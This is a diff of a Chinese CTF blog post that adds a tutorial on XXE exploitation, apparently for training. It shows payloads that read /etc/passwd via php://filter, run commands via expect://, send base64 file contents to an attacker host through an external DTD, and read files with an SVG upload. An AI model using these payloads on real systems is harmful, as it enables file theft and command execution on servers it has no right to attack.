+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">root</span> <span style="color:#66d9ef">[&lt;!ENTITY</span> KFC <span style="color:#66d9ef">SYSTEM</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/read=convert.base64-encode/resource=/etc/passwd&#34;</span><span style="color:#66d9ef">&gt;]&gt;</span>
+</span></span></code></pre></div><p>filter 文件过滤器 read 读取 convert.base64-encode 以base64编码 resource 指定源文件</p>
+<p>叠加之前的环境，payload就是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">root</span> <span style="color:#66d9ef">[&lt;!ENTITY</span> KFC <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;php://filter/read=convert.base64-encode/resource=http://10.1.2.3/?cmd=cat+index.php&#34;</span><span style="color:#66d9ef">&gt;]&gt;</span>
+</span></span></code></pre></div>
+<h3 id="利用expect扩展进行命令执行" data-numberify>利用expect扩展进行命令执行<a class="anchor ms-1" href="#利用expect扩展进行命令执行"></a></h3>
+<p>与 <code>http://</code>、<code>php://</code> 等PHP内置的协议不同，<code>expect://</code> 是一个需要额外安装 <code>Expect</code> 扩展才能使用的<strong>PHP流封装协议</strong>。它的核心作用是<strong>调用系统命令</strong>，并能自动处理命令执行过程中出现的交互式提示（例如输入密码或确认[y/n]），从而实现与命令行程序的自动化交互。在CTF竞赛中，由于 <code>Expect</code> 扩展并非默认安装，所以 <code>expect://</code> 的出场率远低于 <code>file://</code> 或 <code>php://filter</code> 等协议。但是，当目标环境开启了 <code>Expect</code> 扩展，且常规的文件读取或包含协议被禁用时，可以进一步尝试使用 <code>expect://</code> 协议直接执行系统命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">root</span> <span style="color:#66d9ef">[&lt;!ENTITY</span> KFC <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;expect://id&#34;</span><span style="color:#66d9ef">&gt;]&gt;</span>
+</span></span></code></pre></div><p>这样就可以执行id命令，当然也可以执行ls等命令。</p>
+<p>但是在expect伪协议中出现这七个字符会被拒绝:</p>
+<pre tabindex="0"><code> 空格 &#34;&#34;双引号 |管道符 {}大括号 \反斜杠 &lt;&gt;尖括号 :冒号
+</code></pre><p>那我们想要执行cat /flag怎么办呢？答曰：<code>cat$IFS/flag</code></p>
+
+<h3 id="无回显xxe带外数据" data-numberify>无回显XXE带外数据<a class="anchor ms-1" href="#无回显xxe带外数据"></a></h3>
+<p>步骤：一、验证XXE漏洞是否存在(DNSLOG/Collaborator) 二、带外数据(把数据带出来)</p>
+
+<h4 id="验证xxe漏洞是否存在" data-numberify>验证XXE漏洞是否存在<a class="anchor ms-1" href="#验证xxe漏洞是否存在"></a></h4>
+<p>在拦截下数据包后，我们插入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">root</span> <span style="color:#66d9ef">[&lt;!ENTITY</span> % file <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;http://gj3m16xxxxxxx.burpcollaborator.net&#34;</span><span style="color:#66d9ef">&gt;</span>%file;<span style="color:#66d9ef">]&gt;</span>
+</span></span></code></pre></div><p>插入DNS查询动作，我们可以通过查询这个域名的DNS解析记录，来查看目标靶机是否存在XXE漏洞</p>
+<p>或者我们去搞个公网ip开放端口查看请求记录，如果有记录说明靶机是请求了我们的地址，存在漏洞</p>
+
+<h4 id="带外数据" data-numberify>带外数据<a class="anchor ms-1" href="#带外数据"></a></h4>
+<p>尝试构造payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">test</span> <span style="color:#66d9ef">[</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">&lt;!ENTITY</span> % file <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span>]<span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">&lt;!ENTITY</span> % send <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;http://gj3m16xxxxxxx.burpcollaborator.net/%file;&#34;</span><span style="color:#66d9ef">&gt;</span>%send;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">]&gt;</span>
+</span></span></code></pre></div><p><strong>XXE，轻而易举啊！</strong></p>
+<p>坏了坏了，怎么啥都没有啊，XML怎么没调用？</p>
+<p>内部DTD禁止参数实体内再次调用参数实体，我们在%send参数实体里面调用了%file参数实体，所以不能调用。</p>
+<p>外部DTD可以重复调用参数实体，允许参数实体调用其他参数实体。就是我们要再搞个外部机器(kali)，装着dtd文件，然后让靶机去读取我们kali里面的实体。</p>
+<p>首先，1.dtd:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!ENTITY</span> % file <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&#34;</span><span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- 因为直接用file伪协议读取，会导致遇到换行符显示不全，所以要这样做 --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!ENTITY</span> % int <span style="color:#e6db74">&#34;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://192.168.3.110:7777/?p=%file;&#39;&gt;&#34;</span><span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- http会给前面的百分号解码，所以要写成实体(假设我们的kali地址是192.168.3.110:7777) --&gt;</span>
+</span></span></code></pre></div><p>带外数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">conver</span> <span style="color:#66d9ef">[&lt;!ENTITY</span> % remote <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;http://192.168.3.110/1.dtd&#34;</span><span style="color:#66d9ef">&gt;</span>%remote; %int; %send;<span style="color:#66d9ef">]&gt;</span>
+</span></span></code></pre></div><p>调用%remote和%int就相当于把1.dtd的内容写入参数里面，%send发送我们的数据。</p>
+
+<h3 id="xinclude" data-numberify>Xinclude<a class="anchor ms-1" href="#xinclude"></a></h3>
+<p>xml include类似文件包含，我们可以定义功能函数，重复调用，增加代码的简洁性和可读性</p>
+<p>php引用函数：<code>&lt;?php include('/file.php')</code></p>
+<p>xinclude:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;webpage</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2003/XInclude&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;body&gt;</span>Hello world!<span style="color:#f92672">&lt;/body&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;xi:include</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;templates/footer.xml&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/webpage&gt;</span>
+</span></span></code></pre></div><p>调用<code>templates/</code>目录下的文件<code>footer.xml</code>的页脚xml文件</p>
+<p>页脚文件类似<code>&lt;footer&gt;© Contoso Corp,2003&lt;/footer&gt;</code></p>
+<p>最后渲染出来的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">webpage</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">body</span>&gt;Hello world!&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">footer</span>&gt;© Contoso Corp,2003&lt;/<span style="color:#f92672">footer</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">webpage</span>&gt;
+</span></span></code></pre></div><p>外部实体无法成为一个成熟独立的XML文档，因为它既不允许独立的XML声明，也不允许Doctype声明。</p>
+<p>xinclude 可以调用一个独立完整的XML内容。</p>
+<p><strong>外部实体</strong>的限制</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- 错误示范：外部实体不能这样写 --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY good SYSTEM &#34;good.xml&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- good.xml 内容： --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>  <span style="color:#75715e">&lt;!-- ❌ 不能有XML声明 --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE good [...]&gt;</span>  <span style="color:#75715e">&lt;!-- ❌ 不能有DOCTYPE --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;data&gt;</span>test<span style="color:#f92672">&lt;/data&gt;</span>      <span style="color:#75715e">&lt;!-- ❌ 不能有根元素 --&gt;</span>
+</span></span></code></pre></div><p><strong>XInclude</strong>的自由</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- 正确示范：XInclude可以这样用 --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;xi:include</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;good.xml&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/root&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- good.xml 内容（完全合法） --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>  <span style="color:#75715e">&lt;!-- ✅ 可以有 --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE good [...]&gt;</span>  <span style="color:#75715e">&lt;!-- ✅ 可以有 --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;good&gt;</span>                 <span style="color:#75715e">&lt;!-- ✅ 必须有根元素 --&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;data&gt;</span>test<span style="color:#f92672">&lt;/data&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/good&gt;</span>
+</span></span></code></pre></div>
+<h3 id="使用svg进行xxe漏洞利用" data-numberify>使用SVG进行XXE漏洞利用<a class="anchor ms-1" href="#使用svg进行xxe漏洞利用"></a></h3>
+<p>SVG，可缩放矢量图形(Scalable Vector Graphics)基于XML标记语言，用于描述二维的矢量图形，是一种图片格式</p>
+<p>这就意味着我们的SVG文件是可以用文档编辑器直接打开的，可以看到XML语言。</p>
+<p>我们可以通过SVG文件进行XXE漏洞利用，从而读取文件（比如某些文件上传题目）</p>
+<p>SVG payload belike:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">&lt;!DOCTYPE svg [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 	&lt;!ENTITY xxe SYSTEM &#34;file:flag.txt&#34; &gt;</span>
+</span></span><span style="display:flex;"><span>	]&gt;
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;500px&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;100px&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;text</span> <span style="color:#a6e22e">font-family=</span><span style="color:#e6db74">&#34;Verdana&#34;</span> <span style="color:#a6e22e">font-size=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;10&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;40&#34;</span><span style="color:#f92672">&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/text&gt;&lt;/svg&gt;</span>
+</span></span></code></pre></div><p>新年快乐</p>
 </div>
 </div>
 </div><div class="card-footer">
@@ -313,7 +703,7 @@ xiaochai_123的小窝
         <div class="slide-inner row gx-0"><div class="col-12 col-md-6 col-lg-4 me-2">
             <div class="post-card card card-body p-0 border-0 surface">
   
-  <picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="http://localhost:1313/images/1.png" loading="lazy"
+  <picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="https://xiaochai-123.github.io/images/1.png" loading="lazy"
      width="2400"
      height="1350"/>
   </picture>
@@ -330,7 +720,7 @@ xiaochai_123的小窝
           </div><div class="col-12 col-md-6 col-lg-4 me-2">
             <div class="post-card card card-body p-0 border-0 surface">
   
-  <picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="http://localhost:1313/images/SQL.png" loading="lazy"
+  <picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="https://xiaochai-123.github.io/images/SQL.png" loading="lazy"
      width="1546"
      height="699"/>
   </picture>
@@ -347,7 +737,7 @@ xiaochai_123的小窝
           </div><div class="col-12 col-md-6 col-lg-4 me-2">
             <div class="post-card card card-body p-0 border-0 surface">
   
-  <picture><img class="img-fluid" alt="SQL注入——sqli-labs学习笔记" src="http://localhost:1313/images/SQL1.png" loading="lazy"
+  <picture><img class="img-fluid" alt="SQL注入——sqli-labs学习笔记" src="https://xiaochai-123.github.io/images/SQL1.png" loading="lazy"
      width="474"
      height="240"/>
   </picture>
@@ -364,7 +754,7 @@ xiaochai_123的小窝
           </div><div class="col-12 col-md-6 col-lg-4 me-2">
             <div class="post-card card card-body p-0 border-0 surface">
   
-  <picture><img class="img-fluid" alt="双重md5爆破" src="http://localhost:1313/images/MD5.png" loading="lazy"
+  <picture><img class="img-fluid" alt="双重md5爆破" src="https://xiaochai-123.github.io/images/MD5.png" loading="lazy"
      width="626"
      height="251"/>
   </picture>
@@ -489,7 +879,7 @@ xiaochai_123的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="XXE漏洞利用" src="http://localhost:1313/images/xxe.png" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="XXE漏洞利用" src="https://xiaochai-123.github.io/images/xxe.png" loading="lazy"
      width="700"
      height="502"/>
   </picture>
@@ -501,7 +891,7 @@ xiaochai_123的小窝
       </a>
       <div class="post-meta mt-2">
         <span class="post-date">
-          December 27, 2025
+          February 17, 2026
         </span>
       </div>
     </div>
@@ -513,7 +903,7 @@ xiaochai_123的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="http://localhost:1313/images/1.png" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="https://xiaochai-123.github.io/images/1.png" loading="lazy"
      width="2400"
      height="1350"/>
   </picture>
@@ -537,7 +927,7 @@ xiaochai_123的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="http://localhost:1313/images/SQL.png" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="https://xiaochai-123.github.io/images/SQL.png" loading="lazy"
      width="1546"
      height="699"/>
   </picture>
@@ -561,7 +951,7 @@ xiaochai_123的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="SQL注入——sqli-labs学习笔记" src="http://localhost:1313/images/SQL1.png" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SQL注入——sqli-labs学习笔记" src="https://xiaochai-123.github.io/images/SQL1.png" loading="lazy"
      width="474"
      height="240"/>
   </picture>
@@ -600,7 +990,42 @@ xiaochai_123的小窝
         </div>
       </div>
     </div>
-
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        Contents
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#dtd-doucument-type-definition">DTD (Doucument Type Definition)</a></li>
+    <li><a href="#xml实体">XML实体</a>
+      <ul>
+        <li><a href="#预定义实体"><strong>预定义实体</strong></a></li>
+        <li><a href="#命名实体"><strong>命名实体</strong></a></li>
+        <li><a href="#参数实体"><strong>参数实体</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#xxe漏洞">XXE漏洞</a>
+      <ul>
+        <li><a href="#有回显的xxe漏洞">有回显的XXE漏洞</a></li>
+        <li><a href="#利用参数实体及外部实体读取文件">利用参数实体及外部实体读取文件</a></li>
+        <li><a href="#利用xxe进行ssrf利用">利用XXE进行SSRF利用</a></li>
+        <li><a href="#利用php伪协议读取文件">利用PHP伪协议读取文件</a></li>
+        <li><a href="#利用expect扩展进行命令执行">利用expect扩展进行命令执行</a></li>
+        <li><a href="#无回显xxe带外数据">无回显XXE带外数据</a></li>
+        <li><a href="#xinclude">Xinclude</a></li>
+        <li><a href="#使用svg进行xxe漏洞利用">使用SVG进行XXE漏洞利用</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
 
 
 
@@ -622,11 +1047,11 @@ xiaochai_123的小窝
   </div>
   <div class="offcanvas-body mt-2"><div class="social-share mb-4 d-flex overflow-auto">
       <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="X Share Button"
-      target="_blank" href="https://x.com/intent/tweet?title=XXE%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8&url=http%3a%2f%2flocalhost%3a1313%2fposts%2fxxe%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%25A9%25E7%2594%25A8%2f">
+      target="_blank" href="https://x.com/intent/tweet?title=XXE%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8&url=https%3a%2f%2fxiaochai-123.github.io%2fposts%2fxxe%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%25A9%25E7%2594%25A8%2f">
         <i class="fab fa-2x fa-fw fa-x-twitter mb-2"></i> X
       </a>
       <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="Facebook Share Button"
-        target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fxxe%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%25A9%25E7%2594%25A8%2f">
+        target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fxiaochai-123.github.io%2fposts%2fxxe%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%25A9%25E7%2594%25A8%2f">
         <i class="fab fa-2x fa-fw fa-facebook-f mb-2"></i> Facebook
       </a>
     </div>
@@ -646,7 +1071,7 @@ xiaochai_123的小窝
 </div><div class="row text-center">
   <div class="col-12 mt-2">
     <p class="mb-2">xiaochai_123的小窝</p>
-    <p class="text-secondary mb-2"><small>Welcome to xiaochai_123’s Blog! I look forward to sharing this great journey with you.</small></p>© 2025 xiaochai-123. 欢迎转载但请注明出处 | 本博客内容版权所有
+    <p class="text-secondary mb-2"><small>Welcome to xiaochai_123’s Blog! I look forward to sharing this great journey with you.</small></p>© 2026 xiaochai-123. 欢迎转载但请注明出处 | 本博客内容版权所有
     <div class="footer-line visitor" style="margin: 0.5em 0;">
       <span id="busuanzi_container_site_uv" title="总访客数" style="display: inline;">
         👤 总访客数 <span id="busuanzi_value_site_uv">...</span>
@@ -671,7 +1096,7 @@ xiaochai_123的小窝
         <i class="fa-fw fa-2x fab fa-github"
           ></i>
       </a>
-  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="http://localhost:1313/index.xml" title="RSS" rel="me">
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://xiaochai-123.github.io/index.xml" title="RSS" rel="me">
     <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
   </a>
 </nav>
@@ -681,8 +1106,8 @@ xiaochai_123的小窝
 <script src="/js/copy-code.js"></script>
 <link rel="stylesheet" href="/css/copy-code.css">
 </footer>
-<script data-precache src="/assets/main/bundle.min.0cb56b3304aadd564b77fa39a0faba86b5cf15e006f0c12f64ba27b354b58e3c.js" integrity="sha256-DLVrMwSq3VZLd/o5oPq6hrXPFeAG8MEvZLons1S1jjw=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.cbea61263c4ff4af25077451650e39434ea61f115c240d221e2dc739ad82b60b.js" integrity="sha256-y&#43;phJjxP9K8lB3RRZQ45Q06mHxFcJA0iHi3HOa2Ctgs=" crossorigin="anonymous" defer></script>
-<script data-precache src="/assets/viewer/bundle.min.560dde3e6a332bcfb3c948907022a5a35751d968de94ab4ef36371ab392ed913.js" integrity="sha256-Vg3ePmozK8&#43;zyUiQcCKlo1dR2WjelKtO82Nxqzku2RM=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/main/bundle.min.5f7fecfd2a8f9951e8efea436dc08e86e678d38ab9eeb343e3d1324d57f3f64a.js" integrity="sha256-X3/s/SqPmVHo7&#43;pDbcCOhuZ404q57rND49EyTVfz9ko=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
 <script src="https://giscus.app/client.js"
     data-repo="xiaochai-123/xiaochai-123.github.io"
     data-repo-id="R_kgDOQcBRNA"
